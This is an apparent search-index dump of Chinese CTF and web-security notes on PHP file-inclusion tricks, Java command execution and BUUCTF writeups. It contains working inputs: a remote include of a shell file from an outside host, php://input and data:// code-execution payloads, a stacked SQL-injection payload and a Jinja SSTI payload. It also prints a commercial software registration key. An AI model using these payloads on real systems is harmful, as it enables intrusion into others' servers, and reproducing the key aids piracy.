Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 \u97f3\u9891\u6d41 expect:// \u2014 \u5904\u7406\u4ea4\u4e92\u5f0f\u7684\u6d41 file:// \u8fd9\u4e2a\u534f\u8bae\u53ef\u4ee5\u5c55\u73b0\u672c\u5730\u6587\u4ef6\u7cfb\u7edf,\u9ed8\u8ba4\u76ee\u5f55\u662f\u5f53\u524d\u7684\u5de5\u4f5c\u76ee\u5f55\u3002 file:///path/to/file.ext \u5728\u6587\u4ef6\u5305\u542b\u4e2d\u5176\u5b9e\u4e5f\u5c31\u662f\u7b49\u4ef7 /path/to/file.ext` \u4f46\u662f\u5982\u679c\u6765\u4e2a\u9898\u76ee\u7ed9\u4f60\u6765\u4e2a\u6b63\u5219\u5339\u914d`../` \u6216`/ \u5f00\u5934\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u7ed5\u8fc7\u4e86\u3002 php:// (1)php://input\u662f\u4e2a\u53ef\u4ee5\u8bbf\u95ee\u8bf7\u6c42\u7684\u539f\u59cb\u6570\u636e\u7684\u53ea\u8bfb\u6d41 (2)php://filter \u662f\u4e00\u79cd\u5143\u5c01\u88c5\u5668\uff0c \u8bbe\u8ba1\u7528\u4e8e\u6570\u636e\u6d41\u6253\u5f00\u65f6\u7684\u7b5b\u9009\u8fc7\u6ee4\u5e94\u7528 1 2 3 4 5 6 7 1 readfile(\"http://www.example.com\"); \u7b49\u4ef7\u4e8ereadfile(\"php://filter/resource=http://www.example.com\"); 2 \u8bfb\u53d6\u94fe file_get_contents(\"php://filter/read=convert.base64-encode/resource=test.php\"); 3. \u5199\u5165\u94fe file_put_contents(\"php://filter/write=convert.base64-decode/resource=[file]\",\"base64\"); \u8fd9\u4e2a\u70b9\u5728ctf\u6709\u65f6\u5019\u4f1a\u5f88\u6709\u7528,\u53ef\u4ee5\u7ed5\u8fc7\u4e00\u4e9bwaf (3)php://input \u53ef\u4ee5\u8bbf\u95ee\u8bf7\u6c42\u7684\u539f\u59cb\u6570\u636e\u7684\u53ea\u8bfb\u6d41, \u5c06post\u8bf7\u6c42\u4e2d\u7684\u6570\u636e\u4f5c\u4e3aPHP\u4ee3\u7801\u6267\u884c\u3002 \u6709\u81ea\u8eab\u5c40\u9650\u6027: allow_url_fopen :off/on (\u9ed8\u8ba4\u914d\u7f6eon) allow_url_include:on (\u9ed8\u8ba4\u914d\u7f6eoff) GetShell\u601d\u8def \u00b6 allow_url_include \u5f00\u542f\u7684\u60c5\u51b5 \u00b6 allow_url_include \u9ed8\u8ba4\u73af\u5883\u5728php5.2\u4e4b\u540e\u9ed8\u8ba4\u4e3aoff,\u6240\u4ee5\u8bf4\u8fd9\u4e2a\u7528\u6cd5\u6bd4\u8f83\u9e21\u808b,\u4f46\u662f\u5e73\u65f6\u5728\u770bphpinfo\u7684\u65f6\u5019\u53ef\u4ee5\u67e5\u770b\u4e0b\u8fd9\u4e2a\u662f\u5426\u5f00\u542f\u3002 allow_url_fopen \u9ed8\u8ba4\u5f00\u542f,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5229\u7528\u8fdc\u7a0burl\u6216\u8005php://\u534f\u8bae\u76f4\u63a5getshell 1. http://127.0.0.1:8888/ctf/cli/3.php?file=http://remote.com/shell.txt 2. http://127.0.0.1:8888/ctf/cli/3.php?file=php://input PostData:<?php phpinfo();?> \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u4e00\u70b9\u7684\u662f\u6d4f\u89c8\u5668\u5728\u4f20\u8f93\u8fc7\u7a0b\u4f1a\u5bf9\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u8fdb\u884curl\u7f16\u7801,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528burp\u7ed5\u8fc7\u8fd9\u4e00\u6b65 \u6216\u8005\u76f4\u63a5curl \u547d\u4ee4 curl -v \"http://127.0.0.1:8888/ctf/cli/3.php?file=php://input\" -d \"<?php phpinfo();?>\" 3. http://10.211.55.20:8081/test.php?file=data://text/plain;base64,PD9waHAgIHBocGluZm8oKTs/Pg== \u901a\u8fc7 data:// \u534f\u8bae\u53ef\u4ee5\u76f4\u63a5\u89e3\u6790base64\u7f16\u7801 allow_url_include \u5173\u95ed\u53ccoff\u7684\u60c5\u51b5(window\u73af\u5883\u4e0b) \u00b6 \u5c31\u7b97\u5373\u4f7f allow_url_include and allow_url_fopen \u5747\u4e3aoff \u5728 window\u4e3b\u673a\u73af\u5883 \u4e0b\u4ecd\u7136\u53ef\u4ee5\u8fdb\u884c\u8fdc\u7a0b\u6587\u4ef6\u6267\u884c 1\uff1a\u4ec0\u4e48\u662fUNC\u8def\u5f84\uff1fUNC\u8def\u5f84\u5c31\u662f\u7c7b\u4f3c\\softer\u8fd9\u6837\u7684\u5f62\u5f0f\u7684\u7f51\u7edc\u8def\u5f84\u3002 2\uff1aUNC\u4e3a\u7f51\u7edc\uff08\u4e3b\u8981\u6307\u5c40\u57df\u7f51\uff09\u4e0a\u8d44\u6e90\u7684\u5b8c\u6574Windows 2000\u540d\u79f0\u3002 \u6ce8\u610f\u4e3b\u8981\u8fd9\u4e2a\u5b57,\u6240\u4ee5\u8bf4\u4e5f\u652f\u6301\u8fdc\u7a0b\u7f51\u7edc \u683c\u5f0f\uff1a\\servername\\sharename\uff0c\u5176\u4e2dservername\u662f\u670d\u52a1\u5668\u540d\u3002sharename\u662f\u5171\u4eab\u8d44\u6e90\u7684\u540d\u79f0\u3002 \u76ee\u5f55\u6216\u6587\u4ef6\u7684UNC\u540d\u79f0\u53ef\u4ee5\u5305\u62ec\u5171\u4eab\u540d\u79f0\u4e0b\u7684\u76ee\u5f55\u8def\u5f84\uff0c\u683c\u5f0f\u4e3a\uff1a\\servername\\sharename\\directory\\filename\u3002 2\uff1aunc\u5171\u4eab\u5c31\u662f\u6307 \u7f51\u7edc\u786c\u76d8 \u7684\u5171\u4eab \u56e0\u4e3a allow_url_include \u4e3aoff\u7684\u65f6\u5019,php\u4e0d\u4f1a\u52a0\u8f7d\u8fdc\u7a0b\u7684http \u6216\u8005 ftp\u7684url,\u4f46\u662f\u6ca1\u6709\u7981\u6b62SMB\u7684URL\u52a0\u8f7d\u3002 \u56e0\u4e3aSMB share\u670d\u52a1\u5668\u9700\u8981\u7528UNC\u8def\u5f84\u53bb\u8bbf\u95ee,\u800cLinux\u6ca1\u6709UNC\u8def\u5f84\u6240\u4ee5\u8fd9\u79cd\u65b9\u6cd5\u53ea\u80fd\u5728window\u4e0b\u5229\u7528 \u5c1d\u8bd5\u5305\u542b\u65e5\u5fd7\u6587\u4ef6\u3001\u73af\u5883\u6587\u4ef6\u7b49\u53ef\u63a7\u6587\u4ef6 \u00b6 \u8fd9\u79cd\u5229\u7528\u65b9\u5f0f\u5176\u5b9e\u5728\u5b9e\u6218\u4e2d\u662f\u6bd4\u8f83\u9e21\u808b\u7684,\u56e0\u4e3a\u9ed8\u8ba4\u7684\u6743\u9650\u662f\u4e0d\u5141\u8bb8\u8bbf\u95ee\u7684,\u4f46\u662f\u53ef\u4ee5\u53bb\u5c1d\u8bd5\u4e0b\u3002 \u4e0d\u8fc7\u5982\u679c\u4e3b\u673a\u662fwindow\u7cfb\u7edf,\u50cfphpstudy\u90a3\u79cd\u4e00\u952e\u5b89\u88c5\u7684\u90fd\u5177\u6709\u9ad8\u6743\u9650,\u5b8c\u5168\u53ef\u4ee5\u901a\u8fc7\u5305\u542b\u4e00\u4e9b\u6587\u4ef6\u6765getshell\u3002","title":"\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf"},{"location":"web_sec/audit/\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf/#_1","text":"","title":"\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf"},{"location":"web_sec/audit/\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf/#_2","text":"include require include_once require_once include\u5982\u679c\u6ca1\u6709\u627e\u5230\u6587\u4ef6\u4f1a\u53d1\u51fa\u8b66\u544a\uff0c\u800crequire\u5219\u4f1a\u53d1\u51fa\u4e00\u4e2a\u81f4\u547d\u9519\u8bef \u5982\u679c\u201cURL include wrappers\u201d\u5728 PHP \u4e2d\u88ab\u6fc0\u6d3b\uff0c\u53ef\u4ee5\u7528 URL\uff08\u901a\u8fc7 HTTP \u6216\u8005\u5176\u5b83\u652f\u6301\u7684\u5c01\u88c5\u534f\u8bae\u2014\u2014\u89c1\u652f\u6301\u7684\u534f\u8bae\u548c\u5c01\u88c5\u534f\u8bae\uff09\u800c\u4e0d\u662f\u672c\u5730\u6587\u4ef6\u6765\u6307\u5b9a\u8981\u88ab\u5305\u542b\u7684\u6587\u4ef6\u3002\u5982\u679c\u76ee\u6807\u670d\u52a1\u5668\u5c06\u76ee\u6807\u6587\u4ef6\u4f5c\u4e3a PHP \u4ee3\u7801\u89e3\u91ca\uff0c\u5219\u53ef\u4ee5\u7528\u9002\u7528\u4e8e HTTP GET \u7684 URL \u8bf7\u6c42\u5b57\u7b26\u4e32\u6765\u5411\u88ab\u5305\u62ec\u7684\u6587\u4ef6\u4f20\u9012\u53d8\u91cf\u3002\u4e25\u683c\u7684\u8bf4\u8fd9\u548c\u5305\u542b\u4e00\u4e2a\u6587\u4ef6\u5e76\u7ee7\u627f\u7236\u6587\u4ef6\u7684\u53d8\u91cf\u7a7a\u95f4\u5e76\u4e0d\u662f\u4e00\u56de\u4e8b\uff1b\u8be5\u811a\u672c\u6587\u4ef6\u5b9e\u9645\u4e0a\u5df2\u7ecf\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u4e86\uff0c\u800c\u672c\u5730\u811a\u672c\u5219\u5305\u62ec\u4e86\u5176\u7ed3\u679c\u3002 \u652f\u6301\u534f\u8bae\u548c\u5c01\u88c5\u534f\u8bae file:// \u2014 \u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf http:// \u2014 \u8bbf\u95ee HTTP(s) \u7f51\u5740 ftp:// \u2014 \u8bbf\u95ee FTP(s) URLs php:// \u2014 \u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09 zlib:// \u2014 \u538b\u7f29\u6d41 data:// \u2014 \u6570\u636e\uff08RFC 2397\uff09 glob:// \u2014 \u67e5\u627e\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84\u6a21\u5f0f phar:// \u2014 PHP \u5f52\u6863 ssh2:// \u2014 Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 \u97f3\u9891\u6d41 expect:// \u2014 \u5904\u7406\u4ea4\u4e92\u5f0f\u7684\u6d41 file:// \u8fd9\u4e2a\u534f\u8bae\u53ef\u4ee5\u5c55\u73b0\u672c\u5730\u6587\u4ef6\u7cfb\u7edf,\u9ed8\u8ba4\u76ee\u5f55\u662f\u5f53\u524d\u7684\u5de5\u4f5c\u76ee\u5f55\u3002 file:///path/to/file.ext \u5728\u6587\u4ef6\u5305\u542b\u4e2d\u5176\u5b9e\u4e5f\u5c31\u662f\u7b49\u4ef7 /path/to/file.ext` \u4f46\u662f\u5982\u679c\u6765\u4e2a\u9898\u76ee\u7ed9\u4f60\u6765\u4e2a\u6b63\u5219\u5339\u914d`../` \u6216`/ \u5f00\u5934\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u7ed5\u8fc7\u4e86\u3002 php:// (1)php://input\u662f\u4e2a\u53ef\u4ee5\u8bbf\u95ee\u8bf7\u6c42\u7684\u539f\u59cb\u6570\u636e\u7684\u53ea\u8bfb\u6d41 (2)php://filter \u662f\u4e00\u79cd\u5143\u5c01\u88c5\u5668\uff0c \u8bbe\u8ba1\u7528\u4e8e\u6570\u636e\u6d41\u6253\u5f00\u65f6\u7684\u7b5b\u9009\u8fc7\u6ee4\u5e94\u7528 1 2 3 4 5 6 7 1 readfile(\"http://www.example.com\"); \u7b49\u4ef7\u4e8ereadfile(\"php://filter/resource=http://www.example.com\"); 2 \u8bfb\u53d6\u94fe file_get_contents(\"php://filter/read=convert.base64-encode/resource=test.php\"); 3. \u5199\u5165\u94fe file_put_contents(\"php://filter/write=convert.base64-decode/resource=[file]\",\"base64\"); \u8fd9\u4e2a\u70b9\u5728ctf\u6709\u65f6\u5019\u4f1a\u5f88\u6709\u7528,\u53ef\u4ee5\u7ed5\u8fc7\u4e00\u4e9bwaf (3)php://input \u53ef\u4ee5\u8bbf\u95ee\u8bf7\u6c42\u7684\u539f\u59cb\u6570\u636e\u7684\u53ea\u8bfb\u6d41, \u5c06post\u8bf7\u6c42\u4e2d\u7684\u6570\u636e\u4f5c\u4e3aPHP\u4ee3\u7801\u6267\u884c\u3002 \u6709\u81ea\u8eab\u5c40\u9650\u6027: allow_url_fopen :off/on (\u9ed8\u8ba4\u914d\u7f6eon) allow_url_include:on (\u9ed8\u8ba4\u914d\u7f6eoff)","title":"\u6587\u4ef6\u5305\u542b\u51fd\u6570"},{"location":"web_sec/audit/\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf/#getshell","text":"","title":"GetShell\u601d\u8def"},{"location":"web_sec/audit/\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf/#allow_url_include","text":"allow_url_include \u9ed8\u8ba4\u73af\u5883\u5728php5.2\u4e4b\u540e\u9ed8\u8ba4\u4e3aoff,\u6240\u4ee5\u8bf4\u8fd9\u4e2a\u7528\u6cd5\u6bd4\u8f83\u9e21\u808b,\u4f46\u662f\u5e73\u65f6\u5728\u770bphpinfo\u7684\u65f6\u5019\u53ef\u4ee5\u67e5\u770b\u4e0b\u8fd9\u4e2a\u662f\u5426\u5f00\u542f\u3002 allow_url_fopen \u9ed8\u8ba4\u5f00\u542f,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5229\u7528\u8fdc\u7a0burl\u6216\u8005php://\u534f\u8bae\u76f4\u63a5getshell 1. http://127.0.0.1:8888/ctf/cli/3.php?file=http://remote.com/shell.txt 2. http://127.0.0.1:8888/ctf/cli/3.php?file=php://input PostData:<?php phpinfo();?> \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u4e00\u70b9\u7684\u662f\u6d4f\u89c8\u5668\u5728\u4f20\u8f93\u8fc7\u7a0b\u4f1a\u5bf9\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u8fdb\u884curl\u7f16\u7801,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528burp\u7ed5\u8fc7\u8fd9\u4e00\u6b65 \u6216\u8005\u76f4\u63a5curl \u547d\u4ee4 curl -v \"http://127.0.0.1:8888/ctf/cli/3.php?file=php://input\" -d \"<?php phpinfo();?>\" 3. http://10.211.55.20:8081/test.php?file=data://text/plain;base64,PD9waHAgIHBocGluZm8oKTs/Pg== \u901a\u8fc7 data:// \u534f\u8bae\u53ef\u4ee5\u76f4\u63a5\u89e3\u6790base64\u7f16\u7801","title":"allow_url_include \u5f00\u542f\u7684\u60c5\u51b5"},{"location":"web_sec/audit/\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf/#allow_url_include-offwindow","text":"\u5c31\u7b97\u5373\u4f7f allow_url_include and allow_url_fopen \u5747\u4e3aoff \u5728 window\u4e3b\u673a\u73af\u5883 \u4e0b\u4ecd\u7136\u53ef\u4ee5\u8fdb\u884c\u8fdc\u7a0b\u6587\u4ef6\u6267\u884c 1\uff1a\u4ec0\u4e48\u662fUNC\u8def\u5f84\uff1fUNC\u8def\u5f84\u5c31\u662f\u7c7b\u4f3c\\softer\u8fd9\u6837\u7684\u5f62\u5f0f\u7684\u7f51\u7edc\u8def\u5f84\u3002 2\uff1aUNC\u4e3a\u7f51\u7edc\uff08\u4e3b\u8981\u6307\u5c40\u57df\u7f51\uff09\u4e0a\u8d44\u6e90\u7684\u5b8c\u6574Windows 2000\u540d\u79f0\u3002 \u6ce8\u610f\u4e3b\u8981\u8fd9\u4e2a\u5b57,\u6240\u4ee5\u8bf4\u4e5f\u652f\u6301\u8fdc\u7a0b\u7f51\u7edc \u683c\u5f0f\uff1a\\servername\\sharename\uff0c\u5176\u4e2dservername\u662f\u670d\u52a1\u5668\u540d\u3002sharename\u662f\u5171\u4eab\u8d44\u6e90\u7684\u540d\u79f0\u3002 \u76ee\u5f55\u6216\u6587\u4ef6\u7684UNC\u540d\u79f0\u53ef\u4ee5\u5305\u62ec\u5171\u4eab\u540d\u79f0\u4e0b\u7684\u76ee\u5f55\u8def\u5f84\uff0c\u683c\u5f0f\u4e3a\uff1a\\servername\\sharename\\directory\\filename\u3002 2\uff1aunc\u5171\u4eab\u5c31\u662f\u6307 \u7f51\u7edc\u786c\u76d8 \u7684\u5171\u4eab \u56e0\u4e3a allow_url_include \u4e3aoff\u7684\u65f6\u5019,php\u4e0d\u4f1a\u52a0\u8f7d\u8fdc\u7a0b\u7684http \u6216\u8005 ftp\u7684url,\u4f46\u662f\u6ca1\u6709\u7981\u6b62SMB\u7684URL\u52a0\u8f7d\u3002 \u56e0\u4e3aSMB share\u670d\u52a1\u5668\u9700\u8981\u7528UNC\u8def\u5f84\u53bb\u8bbf\u95ee,\u800cLinux\u6ca1\u6709UNC\u8def\u5f84\u6240\u4ee5\u8fd9\u79cd\u65b9\u6cd5\u53ea\u80fd\u5728window\u4e0b\u5229\u7528","title":"allow_url_include \u5173\u95ed\u53ccoff\u7684\u60c5\u51b5(window\u73af\u5883\u4e0b)"},{"location":"web_sec/audit/\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf/#_3","text":"\u8fd9\u79cd\u5229\u7528\u65b9\u5f0f\u5176\u5b9e\u5728\u5b9e\u6218\u4e2d\u662f\u6bd4\u8f83\u9e21\u808b\u7684,\u56e0\u4e3a\u9ed8\u8ba4\u7684\u6743\u9650\u662f\u4e0d\u5141\u8bb8\u8bbf\u95ee\u7684,\u4f46\u662f\u53ef\u4ee5\u53bb\u5c1d\u8bd5\u4e0b\u3002 \u4e0d\u8fc7\u5982\u679c\u4e3b\u673a\u662fwindow\u7cfb\u7edf,\u50cfphpstudy\u90a3\u79cd\u4e00\u952e\u5b89\u88c5\u7684\u90fd\u5177\u6709\u9ad8\u6743\u9650,\u5b8c\u5168\u53ef\u4ee5\u901a\u8fc7\u5305\u542b\u4e00\u4e9b\u6587\u4ef6\u6765getshell\u3002","title":"\u5c1d\u8bd5\u5305\u542b\u65e5\u5fd7\u6587\u4ef6\u3001\u73af\u5883\u6587\u4ef6\u7b49\u53ef\u63a7\u6587\u4ef6"},{"location":"web_sec/java\u5ba1\u8ba1/java/","text":"java\u5ba1\u8ba1 \u00b6 \u6267\u884c\u547d\u4ee4 \u00b6 ProcessBuilder \u00b6 1 2 ProcessBuilder pb = new ProcessBuilder ( cmd ); pb . start (); \u4f7f\u7528Runtime \u00b6 1 Runtime . getRuntime (). exec ( cmd ) Runtime.getRuntime().exec() \u7684\u5e95\u5c42\u5b9e\u9645\u4e0a\u4e5f\u662f ProcessBuilder \u4e0d\u80fd\u5229\u7528\u7684\u4ee3\u7801 \u00b6 1 2 3 String str = request . getParameter ( \"url\" ); String cmdstr = \"ping \" + url ; Runtime . getRuntime (). exec ( cmdstr ) \u56e0\u4e3a\u6709\u7a7a\u683c\u7684\u5b58\u5728 \u53c2\u8003 \u00b6 java\u5947\u602a\u7684\u547d\u4ee4\u6267\u884c (\u8fd9\u7bc7\u6587\u7ae0\u53ef\u4ee5\u7814\u7a76\u4e00\u4e0b\u611f\u89c9\u4e0d\u662f\u5f88\u5bf9\uff1f)","title":"java\u5ba1\u8ba1"},{"location":"web_sec/java\u5ba1\u8ba1/java/#java","text":"","title":"java\u5ba1\u8ba1"},{"location":"web_sec/java\u5ba1\u8ba1/java/#_1","text":"","title":"\u6267\u884c\u547d\u4ee4"},{"location":"web_sec/java\u5ba1\u8ba1/java/#processbuilder","text":"1 2 ProcessBuilder pb = new ProcessBuilder ( cmd ); pb . start ();","title":"ProcessBuilder"},{"location":"web_sec/java\u5ba1\u8ba1/java/#runtime","text":"1 Runtime . getRuntime (). exec ( cmd ) Runtime.getRuntime().exec() \u7684\u5e95\u5c42\u5b9e\u9645\u4e0a\u4e5f\u662f ProcessBuilder","title":"\u4f7f\u7528Runtime"},{"location":"web_sec/java\u5ba1\u8ba1/java/#_2","text":"1 2 3 String str = request . getParameter ( \"url\" ); String cmdstr = \"ping \" + url ; Runtime . getRuntime (). exec ( cmdstr ) \u56e0\u4e3a\u6709\u7a7a\u683c\u7684\u5b58\u5728","title":"\u4e0d\u80fd\u5229\u7528\u7684\u4ee3\u7801"},{"location":"web_sec/java\u5ba1\u8ba1/java/#_3","text":"java\u5947\u602a\u7684\u547d\u4ee4\u6267\u884c (\u8fd9\u7bc7\u6587\u7ae0\u53ef\u4ee5\u7814\u7a76\u4e00\u4e0b\u611f\u89c9\u4e0d\u662f\u5f88\u5bf9\uff1f)","title":"\u53c2\u8003"},{"location":"writeup/","text":"writeup \u00b6","title":"writeup"},{"location":"writeup/#writeup","text":"","title":"writeup"},{"location":"writeup/BUUCTF/","text":"BUUCTF \u00b6 \u968f\u4fbf\u6ce8 \u00b6 \u6709\u8fc7\u6ee4\uff1a sqlmap \u53ef\u4ee5\u629b\u51fa\u6570\u636e\u5e93\u540d \u4f46\u662f\u8868\u540d\u6ca1\u6cd5\u5217\u51fa \u5806\u53e0\u6ce8\u5165 get 1' or 1=1 1'; show databases; # 1'; show tables# 1'; show columns from 1919810931114514# \u6709\u4e00\u4e2aflag\u7684\u5b57\u6bb5\u4f46\u662f\u4f60\u67e5\u4e0d\u51fa\u6765 \u63a5\u4e0b\u6765\u770b words \u4ed6\u65e2\u7136\u6ca1\u8fc7\u6ee4 alert \u548c rename\uff0c\u90a3\u4e48\u6211\u4eec\u662f\u4e0d\u662f\u53ef\u4ee5\u628a\u8868\u6539\u4e2a\u540d\u5b57\uff0c\u518d\u7ed9\u5217\u6539\u4e2a\u540d\u5b57\u5462\u3002 \u5148\u628a words \u6539\u540d\u4e3a words1\uff0c\u518d\u628a\u8fd9\u4e2a\u6570\u5b57\u8868\u6539\u540d\u4e3a words\uff0c\u7136\u540e\u628a\u65b0\u7684 words \u91cc\u7684 flag \u5217\u6539\u4e3a id \uff08\u907f\u514d\u4e00\u5f00\u59cb\u65e0\u6cd5\u67e5\u8be2\uff09\u3002 \u8fd9\u6837\u5c31\u53ef\u4ee5\u8ba9\u7a0b\u5e8f\u76f4\u63a5\u67e5\u8be2\u51fa flag \u4e86\u3002 1 2 3 4 .\u6784\u9020 payload \u5982\u4e0b\uff0c\u7136\u540e\u8bbf\u95ee\uff0c\u770b\u5230\u8fd9\u4e2a\u770b\u6765\u5c31\u6267\u884c\u5230\u6700\u540e\u4e00\u4e2a\u8bed\u53e5\u4e86\u3002\uff08\u6539\u8868\u540d\u90a3\u91cc\u76f4\u63a5\u4ece pma \u62f7\u4e86\u4e00\u4e2a\u8bed\u53e5\u8fc7\u6765\u6539- -\uff09 /?inject=1%27;RENAME%20TABLE%20`words`%20TO%20`words1`;RENAME%20TABLE%20`1919810931114514`%20TO%20`words`;ALTER%20TABLE%20`words`%20CHANGE%20`flag`%20`id`%20VARCHAR(100)%20CHARACTER%20SET%20utf8%20COLLATE%20utf8_general_ci%20NOT%20NULL;show%20columns%20from%20words;# /?inject=1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;# \u7136\u540eflag\u5c31\u51fa\u6765\u4e86 FLAG \u00b6 \u4e00\u5f20\u56fe\u7247 zsteg \u5de5\u5177\u5206\u6790\uff1a \u6709\u63d0\u793azip\u6587\u4ef6 \u63d0\u53d6\u51fa\u6765 zsteg 42011487927629132.png -E b1,rgb,lsb,xy > out \u5c1d\u8bd5\u89e3\u538b\u63d0\u53d6\u51fa\u6765\u7684\u95ee\u9898\u63d0\u793a\u62a5\u9519 \u4e00\u822c\u7528winrar\u89e3\u538b\u7f29\u9519\u8bef\u7684\u90fd\u53ef\u4ee5\u75287z\u89e3\u538b\u7f29 \u7136\u540e\u5c31\u5f97\u5230\u4e86\u4e00\u4e2a elf \u683c\u5f0f\u7684\u6587\u4ef6 \u8fd0\u884c\u5c31\u53ef\u4ee5\u5f97\u5230flag \u955c\u5b50\u91cc\u9762\u7684\u4e16\u754c \u00b6 \u76f4\u63a5\u4e0a zsteg \u5de5\u5177 ningen |MISC \u00b6 \u6709\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u4f46\u662f\u6ca1\u6709\u7206\u7834\u51fa\u5bc6\u7801 rar | MISC \u00b6 \u5b66\u4e60\u4e00\u4e9b\u5982\u4f55\u7206\u7834\u538b\u7f29\u5305 \u8fd9\u6837\u5c31\u53ef\u4ee5\u8bbe\u7f6e\u957f\u5ea6\u4e3a\u591a\u5c11\u4e86 \u4f46\u662f\u7206\u7834\u633a\u6162\u7684\uff0c\u627e\u4e86\u4e00\u4e2a\u6ce8\u518c\u7801 **ARCHPRP-GSVMT-66892-GKVMB-52992** \u4e0d\u8fc7\u8fd8\u662f\u5f88\u6162\u662f\u4e3a\u5565\uff1f\uff1f shrine | web \u00b6 \u5728BUUCTF\u4e0a\u627e\u5230\u4e86\u8fd9\u9898\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import flask import os app = flask . Flask ( __name__ ) app . config [ 'FLAG' ] = os . environ . pop ( 'FLAG' ) @app.route ( '/' ) def index (): return open ( __file__ ) . read () @app.route ( '/shrine/<path:shrine>' ) def shrine ( shrine ): def safe_jinja ( s ): s = s . replace ( '(' , '' ) . replace ( ')' , '' ) blacklist = [ 'config' , 'self' ] return '' . join ([ '{{ % s et {}=None%}}' . format ( c ) for c in blacklist ]) + s return flask . render_template_string ( safe_jinja ( shrine )) if __name__ == '__main__' : app . run ( debug = True ) \u7531\u4e8e\u77e5\u9053\u4e86\u601d\u8def\u5229\u7528\u8d77\u6765\u4e5f\u5f88\u7b80\u5355\u4e86 1 url_for.__globals__.current_app.config \u5c31\u53ef\u4ee5\u4e86 \u6885\u82b1\u9999\u81ea\u82e6\u5bd2\u6765 | MISC \u00b6 \u4f3c\u4e4e\u5c31\u662fbugku\u7684\u4e00\u9053\u9898 \u4e3b\u8981\u662f\u8fd9\u4e32\u7f16\u7801\u5982\u4f55\u5904\u7406 \u5148\u8f6c\u6362\u4e3aASCII\u7801 \u7136\u540e\u7528notepad++\u6253\u5f00\u66ff\u6362\u6389 (,) \u66ff\u6362\u7684\u90a3\u4e2a\u4ec0\u4e48\u90fd\u4e0d\u586b\u5c31\u884c kali\u4e2d\u4f7f\u7528 gnuplot \u753b\u56fe plot \"aaa.txt\" \u6211\u7528WSL\u5931\u8d25\u4e86 \u9762\u5177\u4e0b\u7684flag | MISC \u00b6 \u56fe\u7247\u91cc\u9762\u6709\u4e1c\u897f \u4e0d\u77e5\u9053\u4e3a\u5565\u538b\u7f29\u5305\u91cc\u7684\u5185\u5bb9\u76f4\u63a5\u88ab\u641e\u51fa\u6765\u4e86\uff0c\u672c\u6765\u8fd8\u4ee5\u4e3a\u662f\u660e\u6587\u653b\u51fb\u7684 \u7136\u540estrings\u627e\u4e00\u4e0b\uff0c\u89e3\u7801\u51d1\u9f50flag flag{N7F5_AD5_i5_funny!} webshell | MISC \u00b6 \u7528d\u76fe\u626b\u63cf\u5c31\u884c \u4f46\u662f\u6211\u8fd8\u662f\u4e0d\u77e5\u9053flag\u5728\u54ea\u3002\u3002 \u4e0d\u8fc7\u8ba4\u8bc6\u4e86D\u76fe\u8fd9\u4e2a\u597d\u5de5\u5177 \u8377\u5170\u3002\u3002\u6570\u636e\u6cc4\u9732 | MISC \u00b6 binwalk\uff0cstrings\uff0cforemost\u90fd\u8bd5\u4e86\u4e00\u904d\u90fd\u6ca1\u6548\u679c\u3002\u3002 \u539f\u6765\u662f\u8def\u7531\u5668\u7684\u4e1c\u4e1c \u53bb\u8fd9\u91cc\u4e0b\u8f7d\u4e00\u4e2a\u5de5\u5177 flag\u5c31\u662f\u7528\u6237\u540d \u6570\u636e\u5305\u4e2d\u7684\u7ebf\u7d22 | MISC \u00b6 \u76f4\u63a5\u5bfc\u51faHTTP \u7136\u540e\u53d1\u73b0\u5176\u4e2d\u6709\u4e00\u4e2a\u56fe\u7247\u85cf\u5f97\u6bd4\u8f83\u6df1 \u53c2\u8003 upload| web \u00b6 \u8fd9\u662fqwb\u7684\u4e00\u9053\u9898\u76ee\uff0c\u91cd\u70b9\u8003\u5bdfpop\u94fe\u7684\u6784\u9020\uff0c\u7531\u4e8e\u81ea\u5df1tc\u5bfc\u81f4\u6ca1\u80fd\u641e\u51fa\u6765 \u53c2\u8003\u4e00\u53f6\u98d8\u96f6\u5e08\u5085\u7684\u6587\u7ae0\u5206\u6790\u4e00\u6ce2 \u5728 web/controller/Profile.php \u770b\u5230\u5173\u952e\u51fd\u6570\u64cd\u4f5c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public function upload_img(){ if($this->checker){ if(!$this->checker->login_check()){ $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\"; $this->redirect($curr_url,302); exit(); } } if(!empty($_FILES)){ $this->filename_tmp=$_FILES['upload_file']['tmp_name']; $this->filename=md5($_FILES['upload_file']['name']).\".png\"; 